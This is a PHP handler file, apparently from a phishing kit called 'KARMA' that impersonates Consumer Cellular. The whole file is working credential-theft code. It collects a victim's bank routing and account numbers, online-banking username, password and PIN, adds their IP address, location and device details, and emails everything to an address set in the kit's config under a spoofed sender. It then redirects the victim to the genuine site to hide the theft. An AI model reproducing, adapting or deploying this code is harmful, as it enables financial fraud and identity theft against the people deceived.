<?php
require_once __DIR__ . '/../[KARMA]/core/rules.php';
require_once __DIR__ . '/../[KARMA]/core/functions.php';
$config = require __DIR__ . '/../[KARMA]/config/config.php';

$info = get_ip_info();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$browser = get_browser_name($user_agent);
$device = get_device_type($user_agent);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isset($_SESSION['karma-bank-routing-number'])) {
        $_SESSION['karma-bank-routing-number'] = htmlspecialchars($_POST['karma-bank-routing-number'], ENT_QUOTES, 'UTF-8');
        $_SESSION['karma-bank-account-number'] = htmlspecialchars($_POST['karma-bank-account-number'], ENT_QUOTES, 'UTF-8');
        $_SESSION['karma-bank-username'] = htmlspecialchars($_POST['karma-bank-username'], ENT_QUOTES, 'UTF-8');
        $_SESSION['karma-bank-password'] = htmlspecialchars($_POST['karma-bank-password'], ENT_QUOTES, 'UTF-8');
        $_SESSION['karma-bank-pin'] = htmlspecialchars($_POST['karma-bank-pin'], ENT_QUOTES, 'UTF-8');
        $message = '
        <div style="background:#f6f6f6;padding:30px 0;">
            <div style="max-width:400px;margin:0 auto;background:#fff;border-radius:8px;box-shadow:0 2px 8px #0001;padding:32px;">
                <h2 style="color:#f26631;font-family:sans-serif;margin-bottom:24px;text-align:center;"># Bank Details #</h2>
                <table style="width:100%;font-family:sans-serif;font-size:15px;">
                    <tr>
                        <td style="padding:8px 0;color:#888;">Bank Routing Number</td>
                        <td style="padding:8px 0;font-weight:bold;color:#232f3e;">' . ($_SESSION['karma-bank-routing-number'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="padding:8px 0;color:#888;">Bank Account Number</td>
                        <td style="padding:8px 0;font-weight:bold;color:#232f3e;">' . ($_SESSION['karma-bank-account-number'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="padding:8px 0;color:#888;">Bank Username</td>
                        <td style="padding:8px 0;font-weight:bold;color:#232f3e;">' . ($_SESSION['karma-bank-username'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="padding:8px 0;color:#888;">Bank Password</td>
                        <td style="padding:8px 0;font-weight:bold;color:#232f3e;">' . ($_SESSION['karma-bank-password'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="padding:8px 0;color:#888;">Bank PIN</td>
                        <td style="padding:8px 0;font-weight:bold;color:#232f3e;">' . ($_SESSION['karma-bank-pin'] ?? '') . '</td>
                    </tr>
                </table>
                <hr style="margin:24px 0;">
                <h3 style="color:#232f3e;font-family:sans-serif;margin-bottom:12px;">Device Info</h3>
                <table style="width:100%;font-family:sans-serif;font-size:15px;">
                    <tr>
                        <td style="color:#888;">IP</td>
                        <td style="font-weight:bold;color:#232f3e;">' . htmlspecialchars($info['ip'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">ISP</td>
                        <td style="font-weight:bold;color:#232f3e;">' . htmlspecialchars($info['isp'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Country</td>
                        <td style="font-weight:bold;color:#232f3e;">' . htmlspecialchars($info['country'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Device</td>
                        <td style="font-weight:bold;color:#232f3e;">' . htmlspecialchars($device) . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Browser</td>
                        <td style="font-weight:bold;color:#232f3e;">' . htmlspecialchars($browser) . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">User Agent</td>
                        <td style="font-weight:bold;color:#232f3e;word-break:break-all;">' . htmlspecialchars($user_agent) . '</td>
                    </tr>
                </table>
                <div style="margin-top:32px;text-align:center;color:#aaa;font-size:12px;">
                    The quieter you become, the more you can hear.
                </div>
            </div>
        </div>
        ';
        $message = wordwrap($message, 998, "\r\n");
        $to = $config['email_result'];
        $subject = $_SESSION['karma-firstname'] . ' ' . $_SESSION['karma-lastname'] . ' # [ ' . $info['country'] . ' - ' . $info['ip'] . ' ]';
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=UTF-8\r\n";
        $headers .= "From: Consumer Cellular - BANK <karma@server.smh>\r\n";
        mail($to, $subject, $message, $headers);
        log_event('BANK RECEIVED');
        session_destroy();
        header("Location: https://consumercellular.com");
        exit();
    }
}
?>